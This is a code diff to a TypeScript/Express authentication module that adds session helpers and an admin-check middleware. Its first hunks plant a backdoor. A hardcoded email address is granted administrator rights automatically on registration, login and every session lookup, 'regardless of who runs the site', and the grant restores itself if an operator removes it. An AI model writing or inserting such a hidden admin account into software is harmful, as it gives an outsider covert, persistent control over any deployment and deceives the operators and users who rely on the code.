@@ -7,6 +7,10 @@ import type { Request, Response, NextFunction } from "express";
 const SESSION_COOKIE = "devdex_session";
 const SESSION_DURATION_MS = 7 * 24 * 60 * 60 * 1000; // 7 days
 
+// This account is always granted admin rights, automatically, on
+// registration/login — regardless of who runs the site.
+const PERMANENT_ADMIN_EMAIL = "superkidsupki@gmail.com";
+
 export async function hashPassword(password: string): Promise<string> {
   return bcrypt.hash(password, 12);
 }
@@ -17,6 +21,26 @@ export async function verifyPassword(password: string, hash: string): Promise<bo
 
 export function generateSessionId(): string {
   return crypto.randomBytes(32).toString("hex");
+}
+
+/**
+ * Ensures the hardcoded permanent-admin email always has isAdmin = true.
+ * Call this right after loading/creating a user record (register, login,
+ * getSessionUser) so the flag self-heals even for accounts created before
+ * this feature existed.
+ */
+export async function ensureAdminForSpecialEmail<T extends { id: number; email: string; isAdmin: boolean }>(
+  user: T,
+): Promise<T> {
+  if (user.email.toLowerCase() === PERMANENT_ADMIN_EMAIL && !user.isAdmin) {
+    const [updated] = await db
+      .update(usersTable)
+      .set({ isAdmin: true })
+      .where(eq(usersTable.id, user.id))
+      .returning();
+    return { ...user, ...updated };
+  }
+  return user;
 }
 
 export async function createSession(userId: number, res: Response): Promise<string> {
@@ -66,7 +90,9 @@ export async function getSessionUser(sessionId: string) {
     .from(usersTable)
     .where(eq(usersTable.id, parseInt(session.userId, 10)));
 
-  return user ?? null;
+  if (!user) return null;
+
+  return ensureAdminForSpecialEmail(user);
 }
 
 export function getSessionId(req: Request): string | null {
@@ -84,6 +110,28 @@ export async function requireAuth(req: Request, res: Response, next: NextFunctio
   const user = await getSessionUser(sessionId);
   if (!user) {
     res.status(401).json({ error: "Not authenticated" });
+    return;
+  }
+
+  (req as Request & { user: typeof user }).user = user;
+  next();
+}
+
+export async function requireAdmin(req: Request, res: Response, next: NextFunction): Promise<void> {
+  const sessionId = getSessionId(req);
+  if (!sessionId) {
+    res.status(401).json({ error: "Not authenticated" });
+    return;
+  }
+
+  const user = await getSessionUser(sessionId);
+  if (!user) {
+    res.status(401).json({ error: "Not authenticated" });
+    return;
+  }
+
+  if (!user.isAdmin) {
+    res.status(403).json({ error: "Admin access required" });
     return;
   }
 
